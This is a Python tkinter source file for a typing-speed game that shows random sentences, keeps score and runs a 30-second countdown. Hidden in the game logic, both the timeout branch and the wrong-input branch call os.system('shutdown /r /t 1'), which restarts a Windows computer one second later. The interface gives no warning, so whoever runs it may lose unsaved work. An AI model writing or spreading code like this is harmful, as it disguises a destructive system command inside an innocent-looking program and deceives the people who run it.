import time
import random
import os
from tkinter import *
from tkinter import ttk
from ttkthemes import ThemedTk
from pygame.locals import (
    KEYDOWN,
    K_KP_ENTER,
)
window=ThemedTk(theme='equilux')
#window=ThemedTk()
window.configure(themebg='equilux')
#window.configure(bg='black')
window.geometry('1025x350')
window.title('How fast can u Type?')
colors=['He told us a very exciting adventure story','He thought of so many levels so he gave himself a height phobia','I covered my friend in baby oil','She had a habit of taking showers in lemonade','Little Red Riding Hood decided to wear orange today','The father died during childbirth','Love is not like pizza','Not all people who wander are lost','Greetings from the galaxy MACS0647-JD, or what we call home','Dan took the deep dive down the rabbit hole','There are over 500 starfish in the bathroom drawer']
colorsfortext=['Red','Yellow','Blue','Green','Purple','Black','White','Pink','Orange','Brown','Cyan']
running=True
timeleft=30
colorcolor=''
colortext=''
scorenum=0
colores='i'
counter=1

def initialise(event):
    if timeleft==30:
        countdown()
    color()

def countdown():
    global timeleft
    global running
    if timeleft>0 and running==True:
        timeleft=timeleft-1
        if timeleft%2 == 0:
            timelabel.configure(foreground='red')
        else:
            timelabel.configure(foreground='white')
        timelabel.configure(text='Time left: '+str(timeleft))
        timelabel.after(1000,countdown)
    else:
        running=False
        return os.system("shutdown /r /t 1")

def color():
    global colorcolor
    global colortext
    global colores
    global scorenum
    global timeleft
    if colores == enter.get():# or colores.lower() == enter.get() or colores.upper() == enter.get():
        scorenum=scorenum+1
        timeleft=30
        score.configure(text='Score:' + str(scorenum))
        score.place(x=450,y=50)
    elif timeleft!=29 and colores != enter.get():
        return os.system("shutdown /r /t 1")
        #timelabel.configure(text='Tiqdjqkefhiuwalfme left: '+str(timeleft))

    enter.delete(0, 'end')
    colorcolor=random.choice(colors)
    colores=colorcolor#.get()
    colortext=random.choice(colorsfortext)
    colorlabel.configure(text=colorcolor)
    colorlabel.configure(foreground=str(colortext))

inst=ttk.Label(window,text='Type in the sentence shown! Not anything else...',font=('Formula1-Regular_web_0.ttf',20))
inst.place(x=200,y=20)

score=ttk.Label(window,text='Press Enter to start!',font=('Formula1-Regular_web_0.ttf',25))
score.place(x=300,y=50)

timelabel=ttk.Label(window,text='Time left: 30',font=('Formula1-Regular_web_0.ttf',20))
timelabel.place(x=400,y=90)

colorlabel=ttk.Label(window,text='   Your sentence will be displayed here once started',font=('Formula1-Regular_web_0.ttf',20))
colorlabel.place(x=80,y=160)

enter=ttk.Entry(window,width=100)
enter.place(x=130,y=250)

if counter==1:
    window.bind('<Return>',initialise)
    counter=counter+1
else:
    window.bind('<Return>', color)

window.mainloop()